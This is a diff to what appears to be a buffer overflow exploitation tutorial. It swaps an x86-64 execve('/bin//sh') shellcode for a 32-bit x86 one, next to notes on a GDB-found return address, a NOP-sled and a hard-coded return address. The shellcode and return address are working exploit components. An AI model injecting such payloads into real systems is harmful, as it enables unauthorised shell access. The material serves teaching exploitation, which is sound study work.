@@ -37,7 +37,7 @@ x/700xw $esp #analyzing the stack to detect "AAAA" B(41414141)
 
 With GDB we see that in the stack we have "CCCC" in the **return address** of strcpy, then here we will put our middle-address of the  **NOP-Sled**. Again, any [shellcode](https://www.exploit-db.com/shellcodes/47513) can be used if it is small enough to fit into the NOPs.
 
-`shellcode="\x50\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"`
+`shellcode="\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80"`
 
 `return address="\x4c\xd8\xff\xff"`
 
